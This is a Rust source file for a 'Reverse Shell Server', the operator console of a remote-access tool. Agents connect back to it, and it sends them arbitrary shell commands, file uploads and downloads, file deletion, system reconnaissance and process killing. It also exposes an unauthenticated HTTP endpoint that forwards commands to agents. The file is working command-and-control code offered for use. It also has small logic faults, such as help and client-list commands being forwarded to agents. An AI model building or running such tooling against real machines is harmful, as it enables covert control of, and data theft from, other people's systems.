use clap::{Arg, Command};
use std::fs::File;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::fs::OpenOptions;
use hostname;

/* Client info struct. */
struct ClientInfo {
    id: usize,
    agent_name: String,
    address: SocketAddr,
    stream: Arc<Mutex<TcpStream>>,
}

/* Function to display the prompt. */
fn get_prompt() {

    print!("> ");
    std::io::stdout().flush().unwrap();

}

/* Remove the client from the list. */
fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {

    let mut lock = clients.lock().unwrap();

    // Remove the client from the list by searching for the client ID.
    if let Some(pos) = lock.iter().position(|c| c.id == client_id) {

        lock.remove(pos);

    }

}

/* Function to send the command to the client to execute. */
fn run_client_command(clients: &Arc<Mutex<Vec<ClientInfo>>>, current_line: &str) -> String {

    // Command handling.
    let mut parts = current_line.splitn(2, ' ');
    let id_str = parts.next().unwrap_or("");

    // Extract the command.
    let cmd = parts.next().unwrap_or("");

    // Find the client by ID.
    if let Ok(id) = id_str.parse::<usize>() {

        match send_command_to_client(clients, id, cmd) {
        
            Ok(_) => format!("Command '{}' sent to client {}", cmd, id),
            Err(e) => format!("Error: {}", e),
        
        }

    } else {
        
        "Unknown command. Type 'clients' to list clients.".to_string()
    
    }

}

/* Function to check the input return a reference to a bool. */
fn check_input(parts: Vec<&str>, length_check: usize) -> bool {

    parts.len() < length_check

}

/* Function to print the help message. */
fn help() {

    println!("
        Type 'clients' to list clients.
        Type '<client id> upload <remote path> <localpath>' to upload a file.
        Type '<client id> exec <command>' to send a command.
        Type '<client id> download <remote path> <localpath>' to download a file.
        Type '<client id> pwd ' to get the current working directory.
        Type '<client id> dir <path>' to list the contents of a directory.
        Type '<client id> setcwd <path>' to set the current working directory.
        Type '<client id> mkdir <path>' to create a directory.
        Type '<client id> rmdir <path>' to remove a directory.
        Type '<client id> rm <path>' to remove a file.
        Type '<client id> cat <path>' to print the contents of a file.
        Type '<client id> sysbasic' to get basic system information.
        Type '<client id> sysdetails' to get detailed system information.
        Type '<client id> proc' to list process information.
        Type '<client id> kproc ProcessID' to kill a process.

    ");
    


}

/* Function to send the commands to the clients. */
fn send_command_to_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize, command: &str,) -> Result<(), String> {

    // Lock the client list.
    let mut lock = clients
        .lock()
        .map_err(|_| "Failed to lock clients mutex".to_string())?;

    // Find the client by ID.
    if let Some(client) = lock.iter_mut().find(|c| c.id == client_id) {
    
        let mut cmd_to_send = command.to_string();
    
        // Add null terminator.
        cmd_to_send.push('\0');

        // Lock the client stream.
        let mut stream = client
            .stream
            .lock()
            .map_err(|_| "Failed to lock client stream".to_string())?;

        // Send the command.
        stream
            .write_all(cmd_to_send.as_bytes())
            .map_err(|e| format!("Failed to send command to client {}: {}", client_id, e))?;

        println!("Command sent to client {}", client_id);
        Ok(())

    } else {
        
        Err(format!("No client with ID {} found.", client_id))
    
    }

}

/* Function to handle HTTP requests. */
fn handle_http_request(request_line: &str, clients: &Arc<Mutex<Vec<ClientInfo>>>) -> String {
    
    // GET request format: "GET /?cmd=clients HTTP/1.1"
   
    let mut command = String::new();

    // Get the command from the request line.
    if let Some(start) = request_line.find("/?cmd=") {
    
        // Extract the command after "?cmd=".
        let cmd_start = start + 6;
        if let Some(end) = request_line[cmd_start..].find(' ') {
    
            // The line will have the " HTTP/1.1" so remove it and the command is everything before the space.
            command = request_line[cmd_start..cmd_start+end].to_string();
    
        } else {
    
            // Just in case it doesn't, take the rest of the line.
            command = request_line[cmd_start..].to_string();
    
        }
    
    }

    // If no command was found, return usage instructions.
    if command.is_empty() {

        return "No command provided. Use /?cmd=clients or /?cmd=help.".to_string();
    
    }

    // Remove the %20 from the string.
    command = command.replace("%20", " ");

    // Debug.
    println!("Command: {}", command);

    // Check if clients or help is not in the command.
    if !command.contains("clients") || !command.contains("help") {

            // Send to the client.
            run_client_command(clients, &command);
            
    }
    
    match command.as_str() {

        "help" => {
                
            // call the help function.
            help();
            "".to_string()
        }

        // NOTE: Need to create a function for this and use string formatters to dynamically Create the output.
        // This is duplicated in the web server handling function.
        "clients" => {

            let lock = clients.lock().unwrap();

            if lock.is_empty() {
            
                "No clients connected.".to_string()
            
            } else {
            
                let mut output = String::from("ID | Address | Agent\n");
                output.push_str("-------------------------\n");
                for c in lock.iter() {
        
                    output.push_str(&format!("{} | {} | {}\n", c.id, c.address, c.agent_name));
        
                }
        
                output


            }
        
        }

        other => {

            // Return an error message.
            format!("Command '{}' ", other)
        
        }
    
    }

}

/* Get the OS version. */
fn get_os_version() -> String {

    // Get the OS.
    let os = std::env::consts::OS;
    format!("{}", os)   
    
}

/* Get the hostname. */
fn get_hostname() -> String {

    // Get the hostname.
    let hostname = hostname::get().unwrap().to_string_lossy().to_string();

    // If the hostname is empty then use "No_Hostname".
    if hostname.is_empty() {
    
        "No_Hostname".to_string()
    
    } else {
    
        hostname
    
    }
    

}

fn main() {
 
    // CLI arguments.
    let matches = Command::new("Reverse Shell Server")
        .version("0.3")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Server")
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("IP address to bind to.")
                .required(true),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .default_value("61179")
                .help("Port to bind to.")
        )
        .arg(
            Arg::new("mode")
                .short('m')
                .long("mode")
                .value_name("MODE")
                .help("use: cli or web")
                .required(true),
        )
        .arg(
            Arg::new("session")
                .short('s')
                .long("session")
                .value_name("SESSION")
                .help("Session name and name for the log file.")
                .required(true)
        )
        .arg(
            Arg::new("webport")
                .short('w')
                .long("webport")
                .value_name("WEBPORT")
                .default_value("61180")
                .help("Web port to bind to.")
        )
        
        .get_matches();

    let sessionlog  = matches.get_one::<String>("session").expect("File argument is required.").clone();   
        
    // Get IP address.
    let ipaddress = matches
        .get_one::<String>("IP")
        .expect("IP address argument is required.");

    let themode = matches.get_one::<String>("mode").expect("Mode argument is required.").clone();
    let webport  = matches.get_one::<String>("webport").expect("Web port argument is required.").clone();

    // Get port.
    let port: u16 = matches
        .get_one::<String>("port")
        .expect("Port argument is required.")
        .parse()
        .expect("Port must be a valid number between 0 and 65535");

    // Converting IP address to Ipv4Addr.
    let ip = match ipaddress.parse::<Ipv4Addr>() {

        Ok(ip) => ip,
        Err(e) => panic!("{}", e),

    };

    // Bind to IP address and port.
    let bindaddress = SocketAddrV4::new(ip, port);
    let tcplistener = TcpListener::bind(bindaddress).expect("Could not bind");

    // List of connected clients.
    let clients = Arc::new(Mutex::new(Vec::<ClientInfo>::new()));

    // Clone Arc for command handling thread
    let clients_for_commands = Arc::clone(&clients);

    // Shared line variable for commands.
    let line = Arc::new(Mutex::new(String::new()));
    let line_for_commands = Arc::clone(&line);

    // Spawn a thread to handle user commands
    std::thread::spawn(move || {
    
        let stdin = std::io::stdin();

        loop {
            
            // Otherwise, prompt and read from stdin
            get_prompt();
            let mut input_line = String::new();
            if stdin.read_line(&mut input_line).is_err() {

                eprintln!("Failed to read from stdin.");
                continue;
            
            }

            input_line.trim().to_string();


            let trimmed = input_line.trim().to_string();
            {

                // Lock and update the shared line with the new command.
                let mut l = line_for_commands.lock().unwrap();
                *l = trimmed;

            }

            // Now read the line from the shared variable.
            let current_line = {

                let l = line_for_commands.lock().unwrap();

                l.clone()

            };

            if current_line.is_empty() {
              
                continue;
            
            }

            // Debug.
            
            // println!("current_line: {}", current_line);

            // Split the user input into the ID of the client and the command to send.
            let mut parts = current_line.splitn(2, ' ');

            // ID of the client.
            let _id_str = parts.next().unwrap_or("");

            // Debug.
            //println!("input_line: {}", current_line);
            // Check if the search string is in the current line.
            if current_line.contains("upload") {

                // Split the current line into the command and the file to upload.
                let parts: Vec<&str> = current_line.split_whitespace().collect();

                if check_input(parts.clone(), 4) {

                    // Print error message.
                    println!("Invalid command. Usage: <client id> upload <remote path> <localpath>");
                    continue;
                }

                let id_str = parts[0];
                let rfile = parts[2];
                let lpath = parts[3];

                // Check if the file exists.
                if !std::path::Path::new(lpath).exists() {

                    // Print error message.
                    println!("File does not exist: {}" , lpath);
                    continue;

                }

                // Read the file.
                let mut file = File::open(lpath).unwrap();
                let mut file_buf = Vec::new();
                file.read_to_end(&mut file_buf).unwrap();

                // Base64 encode the file contents.
                let encoded = base64::encode(&file_buf);

                // Convert the encoded string to bytes.
                let new_file_buf = encoded.as_bytes();

                // Get the file size.
                let file_size = file_buf.len();

                // Command line with the file size.
                let upload_command = format!("upload {} {} ", rfile, file_size);
                let mut out_buffer = upload_command.into_bytes();

                // Add the file contents.
                out_buffer.extend_from_slice(&new_file_buf);

                // Convert output buffer to String.
                let encoded = String::from_utf8(out_buffer).unwrap();
            
                // Send to the client.
                if let Ok(id) = id_str.parse::<usize>() {

                    if let Err(e) = send_command_to_client(&clients_for_commands, id, &encoded) {
                    
                        eprintln!("{}", e);
                    
                    }
                
                }
             
             } else if current_line == "help" {
            
                // Call the help function.
                help();
                        
            } else if current_line == "clients" {

                // Debug.
                println!("clients a");
            
                // Print the list of connected clients.
                let lock = clients_for_commands.lock().unwrap();
            
                if lock.is_empty() {
            
                    println!("No clients connected.");
                    get_prompt();
            
                } else {
            
                    println!("ID | Agent Name | Address");
                    println!("-------------------------");

                    for c in lock.iter() {
            
                        println!("{} | {} | {}", c.id, c.agent_name, c.address);
            
                    }
            
                }
            
            // Exit the server.
            } else if current_line == "exit" {

                // Exit the program.
                println!("Exiting...");
                std::process::exit(0);

            } else {
            
                if current_line.contains("download") {

                    // Split the current line into the command and the file to download.
                    let parts: Vec<&str> = current_line.split_whitespace().collect();
   
                    if check_input(parts.clone(), 4) {
   
                        // Print error message.
                        println!("Invalid command. Usage: <client id> download <remote path> <localpath>");
                        continue;

                    }

                }

                // This handles commands that are not "help", "clients", "upload", "download", etc.
                let result = run_client_command(&clients_for_commands, &current_line);
                println!("{}", result);
                get_prompt();
           
            }
        
        }
    
    });

    // Start the HTTP server.
    {
        let clients_for_http = Arc::clone(&clients);

        // Clone the webport variable.
        let webport_cloned = webport.clone();

        // If the mode is web then start the web server.
        if themode == "web" {
     
            std::thread::spawn(move || {
            
                // Set the listener address and port based on the webport_cloned variable.
                let http_listener = TcpListener::bind(format!("0.0.0.0:{}", webport_cloned)).expect("Cannot bind HTTP server");
            
                println!("HTTP server running on http://0.0.0.0:{}. Try /?cmd=clients or /?cmd=help", webport_cloned);
            
                for stream in http_listener.incoming() {
            
                    if let Ok(mut stream) = stream {
            
                        let mut buffer = [0; 1024];
                        if let Ok(read_bytes) = stream.read(&mut buffer) {
            
                            if read_bytes == 0 {
            
                                continue;
            
                            }

                            let request = String::from_utf8_lossy(&buffer[..read_bytes]);
                            let request_line = request.lines().next().unwrap_or("");

                            if request_line.starts_with("GET ") {
            
                                // HTTP request.
                                let response_body = handle_http_request(request_line, &clients_for_http);

                                let response = format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}", response_body.len(), response_body);

                                let _ = stream.write_all(response.as_bytes());

                            } else {
                                
                                // Only Get requests are allowed.
                                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n";
                                let _ = stream.write_all(response.as_bytes());

                            }

                        } // end of if let Ok(read_bytes).

                    } // end of if let Ok(mut stream).

                } // end of for stream.
        
        }); // end of web thread.

        }

    }

    // Initialize the first client ID.
    let mut next_id = 0;

    // Loop over incoming connections.
    for stream_result in tcplistener.incoming() {
    
        // Handle the connection.
        match stream_result {
    
            Ok(client_stream) => {
    
                // Get the client's address.
                let client_address = client_stream.peer_addr().unwrap();

                // Message for the server to see that a client has connected.
                println!("[+] Client connected: {:?}", client_address);
      
                // Clone the client's stream for reading and writing.
                let write_stream = client_stream.try_clone().expect("Failed to clone stream");

                // NOTE: Arc is a synchronization primitive that allows multiple threads to share ownership of the wrapped value.
                let write_stream_arc = Arc::new(Mutex::new(write_stream));

                // Assign an ID to the client.
                let client_id = next_id;

                // Increment the ID for the next client.
                next_id += 1;

                {
                    // Add the new client to the list.
                    let mut clients_lock = clients.lock().unwrap();
                    clients_lock.push(ClientInfo {
                        id: client_id,
                        agent_name: String::new(),
                        address: client_address,
                        stream: Arc::clone(&write_stream_arc),
                    });
                
                }

                // Clone the clients and line Arcs so it is available in the thread.
                let clients_for_thread = Arc::clone(&clients);
                let line_for_thread = Arc::clone(&line);
                let themode_cloned = themode.clone();
                let sessionlog_cloned = sessionlog.clone();

                // Create the thread to handle the client.
                std::thread::spawn(move || {
                    
                    let mut reader = BufReader::new(&client_stream);
                    let mut agent_buf = Vec::new();

                    // Read the agent name from the client.
                    if let Err(e) = reader.read_until(b'\0', &mut agent_buf) {
    
                        eprintln!("Error reading agent name: {}", e);
    
                        remove_client(&clients_for_thread, client_id);
    
                        return;
    
                    }

                    // Convert the agent name to a string.
                    let agent_name = String::from_utf8_lossy(&agent_buf)
                        .trim_end_matches('\0')
                        .trim()
                        .to_string();

                    // Get the OS version and hostname and append it to the agent name separated by hyphens.
                    let os_version = get_os_version();
                    let hostname = get_hostname();

                    let agent_name = format!("{}-{}-{}", agent_name, os_version, hostname);

                    {

                        let mut clients_lock = clients_for_thread.lock().unwrap();

                        // Find the client by its ID and update its agent name.
                        if let Some(c) = clients_lock.iter_mut().find(|c| c.id == client_id) {
    
                            c.agent_name = agent_name.clone();
    
                        }
    
                    }

                    println!("Client {} named: {}", client_id, agent_name);
                    get_prompt();

                    // Now read messages in a loop.
                     loop {

                        // Read the message from the client.
                        let mut buf: Vec<u8> = Vec::new();
                        let bytes_read = match reader.read_until(b'\0', &mut buf) {
                            Ok(b) => b,
                            Err(e) => {
                                eprintln!("Read error from client {}: {}", client_id, e);
                                break;
                            }
                        };
                    
                        // If the client disconnected, break the loop.
                        if bytes_read == 0 {
                            println!("Client {} disconnected", client_id);
                            break;
                        }

                        // Convert the cmd results to a string.
                        let mut message = String::from_utf8_lossy(&buf)
                            .trim_end_matches('\0')
                            .trim()
                            .to_string();
                        message.push('\n');

                        // Lock and read the current line from the shared variable (the input from the user in the loop above or the HTTP server).
                        match themode_cloned.as_str() {

                            "cli" => {

                                // cli mode using current_line
                                let current_line = {
                                let l = line_for_thread.lock().unwrap();
                                l.clone()

                            };

                            // Debug.
                            //println!("current_line: {}", current_line);
                            //println!("current_line in cli: {}", current_line);

                                // Split the current line into tokens.
                                let tokens: Vec<&str> = current_line.split_whitespace().collect();
                                if tokens.len() < 2 {
                                    println!("No valid command provided.");
                                    return;
                                }

                                
                                let todo = if tokens[1].is_empty() { "clients" } else { tokens[1] };
                                let lpath = if tokens.len() > 3 { tokens[3] } else { "" };
                    
                                // Out the results based on the command passed.
                                match todo {

                                    "download" => { 
                                        
                                        // Save the message to the file.
                                        let mut file = File::create(lpath).unwrap();

                                        // Write the message to the local file.
                                        file.write_all(message.as_bytes()).unwrap();

                                        if let Err(e) = file.flush() {

                                            eprintln!("Failed to create file: {}", e);

                                        } else {

                                            println!("File saved to {}", lpath);

                                        }

                                        get_prompt();

                                     }
                                    
                                    // Match muliple commands since they will have the same output format.
                                    "exec" | "mkdir" | "dir" | "cat" | "rm" | "rmdir" | "pwd" | "setcwd" | "sysbasic" | "sysdetails" | "proc" | "kproc" => {

                                        println!("{}", message);
                                        println!("Received from client {}:", client_id);


                                     }

                                    "upload" => {
                                        
                                        println!( "Upload results from client {}: \"{}\"", client_id, message);


                                    }


                                    /*"dir" => {
                                        
                                        println!("{}", message);

                                    }

                                    "mkdir" => {
                                        
                                         println!("{}: \"{}\"", client_id, message);


                                    }

                                    "cat" => {

                                        println!("{}", message);

                                    }*/

                                    _ => {
                                        
                                        println!("Unknown command.");

                                    }

                                }
                    
                                get_prompt();
                            }
                    
                            "web" => {

                                // Output to the HTTP Client.

                                // Debug.
                                println!("Received from client {}: \"{}\"", client_id, message);

                                // Write the response to the file by appending the cli "session" to the filename.
                                let mut file = OpenOptions::new().append(true).create(true).open(format!("{}-filename.txt", sessionlog_cloned)).unwrap();
                                file.write_all(message.as_bytes()).unwrap();

                                
                            }
                    
                            _ => {

                                eprintln!("Unknown mode: {}", themode_cloned);
                                break;
                            
                            }
                        
                        }
                    
                    }

                    // Only remove the client here after they have disconnected,
                    remove_client(&clients_for_thread, client_id);

                });

            }

            Err(e) => eprintln!("Accept error: {}", e),

        }

    }

}
